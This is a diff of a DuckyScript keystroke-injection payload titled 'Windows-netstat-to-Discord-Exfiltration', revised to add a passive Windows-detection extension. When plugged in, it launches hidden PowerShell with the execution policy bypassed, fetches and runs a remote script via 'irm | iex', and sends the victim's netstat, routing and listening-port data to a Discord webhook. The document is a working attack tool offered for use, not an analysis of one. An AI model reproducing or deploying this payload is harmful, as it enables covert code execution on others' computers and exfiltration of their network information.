@@ -1,45 +1,84 @@
-REM ###################################################################
-REM #                                                                 |
-REM # Title        : Windows-netstat-to-Discord-Exfiltration          |
-REM # Author       : Aleff                                            |
-REM # Version      : 1.0                                              |
-REM # Category     : Net, Exfiltration                                |
-REM # Target       : Windows 10-11                                    |
-REM #                                                                 |
-REM ###################################################################
+REM_BLOCK
+###################################################################
+#                                                                 #
+# Title        : Windows-netstat-to-Discord-Exfiltration          #
+# Author       : Aleff                                            #
+# Version      : 1.0                                              #
+# Category     : Net, Exfiltration                                #
+# Target       : Windows 10-11                                    #
+#                                                                 #
+###################################################################
 
-REM Title: Windows-netstat-to-Discord-Exfiltration
-REM Author: Aleff
-REM Description: Opens PowerShell hidden, grabs netstat status, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
-REM Put 1 on the function that you want to active, else 0. Functions available:
-REM - default (simple 'netstat' command)
-REM - routing_table $r
-REM - listening_canonical $lc
-REM - listening_numerical $ln
-REM - all_canonical $ac
-REM - all_numerical $an
-REM - offload ot
-REM - proto $p "<protocol>"
-REM - - In this option you must put the protocol that you want to monitor, for example $p="TCP" if you want to monitor TCP, else leave blank, so $p="".
+Title: Windows-netstat-to-Discord-Exfiltration
+Author: Aleff
+Description: Opens PowerShell hidden, grabs netstat status, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
+Put 1 on the function that you want to active, else 0. Functions available:
+- default (simple 'netstat' command)
+- routing_table $r
+- listening_canonical $lc
+- listening_numerical $ln
+- all_canonical $ac
+- all_numerical $an
+- offload ot
+- proto $p "<protocol>"
+- - In this option you must put the protocol that you want to monitor, for example $p="TCP" if you want to monitor TCP, else leave blank, so $p="".
 
-REM Target: Windows 10-11 (PowerShell)
-REM Version: 1.0
-REM Category: Net, Exfiltration
-REM Requirements: Internet connection
-REM 
+Target: Windows 10-11 (PowerShell)
+Version: 1.0
+Category: Net, Exfiltration
+Requirements: Internet connection
+END_REM
 
 REM REQUIRED - Provide your Discord WEBHOOK
-DEFINE WEBHOOK https://discordapp.com/api/webhooks/<webhook_id>/<token>
+DEFINE #WEBHOOK https://discordapp.com/api/webhooks/<webhook_id>/<token>
 
-DELAY 2000
+REM REQUIRED - Reply example.com with YOUR LINK. The Payload should be Windows-netstat.ps1
+DEFINE #PAYLOAD example.com
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+
 GUI r
 DELAY 250
 DELETE
-STRING powershell -w h -ep bypass $discord='
-
-STRING WEBHOOK
-
-REM REQUIRED - Reply example.com with YOUR LINK. The Payload should be Windows-netstat.ps1
-DEFINE PAYLOAD example.com
-STRING ';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm PAYLOAD | iex
-ENTER
+STRINGLN powershell -w h -ep bypass $discord='#WEBHOOK';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm #PAYLOAD | iex
